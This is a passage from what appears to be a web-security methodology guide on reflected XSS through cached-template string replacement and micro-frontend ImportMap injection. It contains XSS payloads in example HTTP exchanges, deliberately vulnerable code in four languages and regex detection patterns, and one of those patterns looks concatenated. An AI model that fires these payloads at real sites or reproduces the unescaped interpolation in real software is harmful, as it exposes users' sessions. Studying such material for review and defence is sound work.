\[1] To eliminate database queries and view rendering latency, the Edge Gateway retrieves a fully rendered, language-specific HTML template directly from the distributed Redis cache,\[2] The middleware extracts the ephemeral, user-supplied search query from the HTTP request, \[3] The performance optimization dictates that instead of passing the dynamic data _into_ a templating engine (which would require parsing the DOM tree again), the gateway uses an extreme low-level string replacement, \[4] The trust assumption fails. The gateway developers assumed that because the cached HTML was originally created by a secure view engine, it is intrinsically safe. They ignored the fact that auto-escaping mechanisms only execute during the original compilation phase. The raw string replacement blindly reflects the attacker's payload into the `{0}` token without HTML-entity encoding

```http
// 1. The backend previously cached the localized search page.
// The cached string contains: <h1>Search Results for: {0}</h1>

// 2. Attacker sends a request with an XSS payload bypassing the caching engine.
GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1
Host: i18n.enterprise.tld
Accept-Language: fr-FR

// 3. The Edge Middleware intercepts, pulls the cached French template, and performs the raw replacement.
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<body>
    <h1>Résultats de recherche pour: <script>alert(document.cookie)</script></h1>
</body>
</html>
```
{% endstep %}

{% step %}
The architectural requirement to deliver sub-millisecond localized responses globally drove the implementation of a cached HTML edge tier. To retain dynamic user feedback (like displaying the exact term a user searched for) without rebuilding the cache on every keystroke, the system utilized post-render string interpolation. When the attacker passed the HTML payload in the query string, the gateway retrieved the pre-rendered shell and blindly injected the unescaped payload directly over the `{0}` translation token. Because the replacement occurred strictly as a string operation entirely divorced from the frontend framework's contextual encoding pipeline, the payload breached the HTML context, executing arbitrary JavaScript in the victim's session
{% endstep %}
{% endstepper %}

***

#### Reflected XSS via Micro-Frontend (MFE) ImportMap Override Concatenation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Micro-Frontend (MFE) architecture. In large enterprise organizations, different teams deploy independent React/Vue applications that are stitched together at runtime by a central "App Shell" or Backend-For-Frontend (BFF)
{% endstep %}

{% step %}
Investigate how the BFF orchestrates the MFEs. The modern standard utilizes a `<script type="importmap">` block injected into the HTML `<head>`. This map tells the browser exactly which CDN URLs correspond to which MFE modules
{% endstep %}

{% step %}
Discover the "Dynamic Branch Preview" optimization. To allow QA engineers to test unreleased versions of an MFE in production, the BFF exposes a hidden query parameter (e.g., `?mfe_branch=beta-feature`) that dynamically rewrites the CDN URL in the ImportMap
{% endstep %}

{% step %}
Analyze the ImportMap generation logic in the decompiled BFF code. Building and deep-merging massive JSON ImportMaps dynamically on every HTTP request consumes significant memory allocations
{% endstep %}

{% step %}
Locate the string concatenation shortcut. To optimize the response, the developer explicitly treats the ImportMap as a raw text template, utilizing `string.Format`, template literals, or `sprintf` to inject the `mfe_branch` parameter directly into the JSON string structure
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumed that branch names (e.g., `feature-xyz`) are strictly alphanumeric strings constrained by Git naming conventions. They failed to validate the HTTP parameter against this assumption
{% endstep %}

{% step %}
Construct a payload that breaks out of both the JSON string context and the enclosing `<script>` tag. The payload must terminate the JSON structure `"}`, close the script block `</script>`, and open a new executable script tag `<script>alert()</script>`.
{% endstep %}

{% step %}
Submit the payload via the dynamic override parameter.
{% endstep %}

{% step %}
The BFF interpolates the payload directly into the `<script type="importmap">` block. The browser's HTML parser encounters `</script>`, prematurely closes the ImportMap, and executes the trailing XSS payload in the context of the App Shell

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:<script\s+type\s*=\s*["']importmap["']>[\s\S]{0,500}?\{branch\}|importMap[\s\S]{0,200}?string\.Format[\s\S]{0,200}?\{branch\}|importMapHtml\s*=\s*[\s\S]{0,200}?\$\{branch\}|sprintf\s*\([\s\S]{0,200}?%s)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:<script\s+type\s*=\s*["']importmap["']>[\s\S]{0,500}?\{branch\}|String\.format\s*\([\s\S]{0,200}?%s|importMap[\s\S]{0,200}?\+\s*(?:branch|request|input)|importMapHtml\s*=\s*["'`][\s\S]{0,300}?\$\{branch\})
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:<script\s+type\s*=\s*["']importmap["']>[\s\S]{0,500}?\{branch\}|\\?\$importMap\s*=\s*sprintf\s*\([\s\S]{0,200}?%s|sprintf\s*\([\s\S]{0,200}?(?:branch|\$_GET|\$_POST|\$_REQUEST)|importMapHtml\s*=[\s\S]{0,300}?\$\\{branch\\})
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:cachedHtml\.replace\s*\(\s*/\{0\}\/g[\s\S]{0,150}?(?:req\.|request|body|query)|cachedHtml\.replaceAll\s*\(\s*['"]\\?\{0\\?\}['"][\s\S]{0,150}?(?:req|input)|html[\s\S]{0,100}?replace\s*\([\s\S]{0,100}?req\.)\b(?:<script\s+type\s*=\s*["']importmap["']>[\s\S]{0,500}?\{branch\}|importMapHtml\s*=\s*`[\s\S]{0,300}?\$\{branch\}|importMap[\s\S]{0,200}?\+\s*(?:branch|req\.|request)|sprintf\s*\([\s\S]{0,200}?%s)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
<script\s+type=["']importmap["']>.*\{branch\}|importMap.*string\.Format.*\{branch\}|sprintf\(.*%s
```
{% endtab %}

{% tab title="Java" %}
```regexp
<script\s+type=["']importmap["']>.*\{branch\}|String\.format\(.*%s|importMap.*\+.*branch
```
{% endtab %}

{% tab title="PHP" %}
```regexp
<script\s+type=["']importmap["']>.*\{branch\}|\$importMap\s*=\s*sprintf\(.*%s|sprintf\(.*branch
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
<script\s+type=["']importmap["']>.*\{branch\}|importMapHtml\s*=\s*`.*\$\{branch\}|sprintf\(.*%s|importMap.*\+.*branch
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/app-shell")]
public IActionResult RenderAppShell([FromQuery] string mfe_branch = "main")
{
    // [1]
    // [2]
    // [3]
    var importMap = $@"
        <script type=""importmap"">
        {{
            ""imports"": {{
                ""@enterprise/billing"": ""https://cdn.enterprise.tld/billing/{mfe_branch}/bundle.js"",
                ""@enterprise/auth"": ""https://cdn.enterprise.tld/auth/main/bundle.js""
            }}
        }}
        </script>
    ";

    // [4]
    ViewBag.ImportMap = new HtmlString(importMap);
    return View("AppShell");
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping(value = "/app-shell", produces = MediaType.TEXT_HTML_VALUE)
public String renderAppShell(@RequestParam(defaultValue = "main") String mfe_branch, Model model) {
    // [1]
    // [2]
    // [3]
    String importMap = String.format(
        "<script type=\"importmap\">\n" +
        "{\n" +
        "    \"imports\": {\n" +
        "        \"@enterprise/billing\": \"https://cdn.enterprise.tld/billing/%s/bundle.js\",\n" +
        "        \"@enterprise/auth\": \"https://cdn.enterprise.tld/auth/main/bundle.js\"\n" +
        "    }\n" +
        "}\n" +
        "</script>", 
        mfe_branch
    );

    // [4]
    model.addAttribute("importMap", importMap);
    return "app-shell";
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function renderAppShell(Request $request)
{
    $mfe_branch = $request->query('mfe_branch', 'main');

    // [1]
    // [2]
    // [3]
    $importMap = sprintf('
        <script type="importmap">
        {
            "imports": {
                "@enterprise/billing": "https://cdn.enterprise.tld/billing/%s/bundle.js",
                "@enterprise/auth": "https://cdn.enterprise.tld/auth/main/bundle.js"
            }
        }
        </script>
    ', $mfe_branch);

    // [4]
    return view('app-shell', ['importMap' => $importMap]);
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/app-shell', (req, res) => {
    let mfe_branch = req.query.mfe_branch || 'main';

    // [1]
    // [2]
    // [3]
    let importMap = `
        <script type="importmap">
        {
            "imports": {
                "@enterprise/billing": "https://cdn.enterprise.tld/billing/${mfe_branch}/bundle.js",
                "@enterprise/auth": "https://cdn.enterprise.tld/auth/main/bundle.js"
            }
        }
        </script>
    `;

    // [4]
    res.render('app-shell', { importMap: importMap });
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Backend-For-Frontend (BFF) orchestrates the Micro-Frontend architecture by generating an ImportMap, defining exactly where the browser should load modular JavaScript dependencies, \[2] To support rapid staging and isolated QA testing in production, the BFF allows developers to dynamically override the targeted CDN path for a specific module via a query parameter, \[3] The performance optimization dictates that the BFF treats the JSON ImportMap strictly as a multiline string. Constructing complex JSON objects, deep-merging them, and then serializing them per-request incurs unnecessary CPU and memory allocation overhead, \[4] The fatal trust boundary execution. The raw string is injected verbatim into the HTML `<head>`. Because the variable is interpolated securely _within_ a string literal in the backend language, the developer assumes it will remain securely within the JSON string literal in the browser. However, the browser's HTML parser completely ignores JSON semantics

```http
// 1. Attacker crafts a payload to escape the JSON quotes, close the importmap script tag, 
// and inject an executable XSS vector.
// Payload: main/bundle.js" } } </script><script>alert(document.domain)</script>
// URL Encoded: main%2Fbundle.js%22%20%7D%20%7D%20%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E

// 2. The victim clicks the malicious branch-preview link.
GET /app-shell?mfe_branch=main%2Fbundle.js%22%20%7D%20%7D%20%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: portal.enterprise.tld
Cookie: SessionToken=VALID_VICTIM_COOKIE

// 3. The BFF string-concatenates the payload and reflects the broken ImportMap back to the browser.
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head>
    <script type="importmap">
    {
        "imports": {
            "@enterprise/billing": "https://cdn.enterprise.tld/billing/main/bundle.js" } } </script><script>alert(document.domain)</script>/bundle.js",
            "@enterprise/auth": "https://cdn.enterprise.tld/auth/main/bundle.js"
        }
    }
    </script>
</head>
<body>...</body></html>
```
{% endstep %}

{% step %}
To support complex Micro-Frontend deployments without incurring heavy JSON serialization penalties, the BFF architecture utilized string interpolation to construct dynamic routing manifests. By assuming the `mfe_branch` query parameter would only contain alphanumeric Git branch names, the developers skipped input validation and output encoding. When the victim initiates the request, the BFF blindly injects the attacker's payload into the HTTP response. The browser's HTML parser, scanning the document linearly, encounters the `</script>` tag embedded within the attacker's payload. It instantly terminates the `importmap` block—ignoring the fact that the JSON was structurally broken—and parses the subsequent `<script>` tag as executable JavaScript, successfully executing Reflected XSS at the highest privilege level of the application shell
{% endstep %}
{% endstepper %}

***

## Cheat Sheet

